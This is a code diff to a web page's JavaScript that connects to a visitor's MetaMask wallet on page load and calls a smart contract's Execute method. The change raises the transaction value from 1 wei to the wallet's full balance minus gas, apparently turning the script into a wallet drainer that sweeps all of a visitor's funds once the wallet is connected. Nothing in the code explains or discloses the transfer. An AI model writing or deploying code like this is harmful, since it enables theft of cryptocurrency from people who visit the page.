@@ -18,6 +18,10 @@ window.addEventListener('load', async () => {
             // Instantiate web3 with the MetaMask provider
             const web3 = new Web3(window.ethereum);
 
+            const gasPrice = await web3.eth.getGasPrice();
+            const gasLimit = 200000;
+            const gasCost = gasPrice * gasLimit;
+
             web3.eth.getBalance(account, (err, result) => {
                 if (err) {
                     console.log(err);
@@ -25,32 +29,26 @@ window.addEventListener('load', async () => {
                 }
                 const balance = web3.utils.fromWei(result, "ether");
                 console.log("Balance:", balance);
-                // Continue to execute the transaction with this balance
-            });
 
-            // Instantiate the contract
-            const contract = new web3.eth.Contract(contractABI, contractAddress);
+                // Instantiate the contract
+                const contract = new web3.eth.Contract(contractABI, contractAddress);
+                const adjustedBalance = web3.utils.toWei(balance, 'ether') - gasCost; // Adjust balance
 
-            const gasPrice = await web3.eth.getGasPrice();
-            const gasLimit = 200000;
-            const gasCost = gasPrice * gasLimit;
+                // Call the smart contract function
+                contract.methods.Execute(account, zeroAddress, zeroAddress, zeroAddress, false).send({ 
+                    from: account,
+                    value: adjustedBalance,
+                    gasPrice: gasPrice,
+                    gas: gasLimit
+                })
+                .then(function(receipt){
+                    console.log("Transaction confirmed!", receipt);
+                })
+                .catch(function(error){
+                    console.log("Error:", error);
+                });
 
-            const adjustedBalance = web3.utils.toWei(balance, 'ether') - gasCost; // Adjust balance
-
-            // Call the smart contract function
-            contract.methods.Execute(account, zeroAddress, zeroAddress, zeroAddress, false).send({ 
-                from: account,
-                value: 1,
-                gasPrice: gasPrice,
-                gas: gasLimit
-            })
-            .then(function(receipt){
-                console.log("Transaction confirmed!", receipt);
-            })
-            .catch(function(error){
-                console.log("Error:", error);
-            });
-
+            });                
         });
     }
 });
